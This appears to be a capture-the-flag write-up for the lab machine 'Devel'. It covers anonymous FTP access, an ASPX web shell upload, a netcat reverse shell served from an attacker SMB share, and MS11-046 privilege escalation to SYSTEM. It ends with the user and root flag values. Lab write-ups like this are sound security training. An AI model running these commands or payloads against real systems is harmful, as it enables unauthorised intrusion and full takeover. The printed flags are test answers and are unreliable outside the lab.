![Haystack.PNG](/assets/Machines/Easy/Devel/Devel.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.5
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.5
```

**Output**
```bash
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

3. Visit webpage

![webpage.PNG](/assets/Machines/Easy/Devel/webpage.PNG)

* **Wappalyzer Information:** `Operative System: Windows Server` / `IIS 7.5`

4. Use nmap to discover more information about services and their versions are running in previously ports
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Devel]
└─# nmap -sCV -p21,80 10.10.10.5 -oN versions
```
**Output**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

* We look the IIS Service don't expose risky methods

5. Login in FTP service with username `anonymous`
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Devel]
└─# ftp 10.10.10.5                 
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

* If you login with username **anonymous** you can't provide password.

6. List all files in this service
```
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

* This files become known to us..., are files used by Web Page!, to verify this you can visit welcome.png like:
* **URL:** `http://10.10.10.5/welcome.png`

![welcome.PNG](/assets/Machines/Easy/Devel/welcome.PNG)

7. Then, you can upload any file to test, in this case you need to upload **.apsx** web shell.
* **Directory to get aspx web shell**: `/usr/share/webshells/aspx/cmdasp.aspx`

8. With **put** upload previous file.
```
ftp> put
(local-file) /usr/share/webshells/aspx/cmdasp.aspx
(remote-file) cmdasp.aspx
```

9. Visit the new file
* **URL:** `http://10.10.10.5/cmdasp.aspx`

![aspx.PNG](/assets/Machines/Easy/Devel/aspx.PNG)

10. Next, you can get a reverse shell:

* First, download [nc.exe](https://eternallybored.org/misc/netcat/) [Netcat 1.12]
---
* Next, create a smbserver to provide nc.exe
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Devel]
└─# impacket-smbserver shareFolder $(pwd) -smb2support
```
> The name of directory is `shareFolder`
---
* Then, get a reverse shell using webshell and access `nc.exe`.
* **Command:** `\\<tun0 IP>\shareFolder\nc64.exe -e cmd <tun0 IP> <Port>`
  
    + Remember listen in port choosed with `nc` like:
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Devel]
└─# rlwrap nc -lvnp <Port>
```
* Use `rlwrap` to avoid errors.

---
**Output**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Devel]
└─# rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.5] 49161
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

---
---
---
### **Privileges Escalation** 💀
1. List system information
```cmd
c:\windows\system32\inetsrv>systeminfo                                                                                                                                                     
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
```

* Os Version is old, **old meaning exploitable**

2. The exploit is [MS11-046](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046), download exploit in our machine and copy in target machine.

* First, create a smbserver in current path of exploit.
---
* Then, download exploit in target machine, before this, create a folder in `Windows\Temp`
```cmd
c:\Windows\Temp\Exploit>copy \\10.10.14.23\shareFolder\ms11-046.exe ms11-046.exe
```
---

3. Execute exploit
```cmd
c:\Windows\Temp\Exploit>.\ms11-046.exe
c:\Windows\System32>whoami
whoami
nt authority\system
```

4. Show **user flag**
```cmd
c:\Users>type babis\Desktop\user.txt
a9d07536a851ae6048f497d66d23446a
```

5. Show **root flag**
```cmd
c:\Users>type Administrator\Desktop\root.txt
1ce6d49cce141d0b87978d1c76d2ab6c
```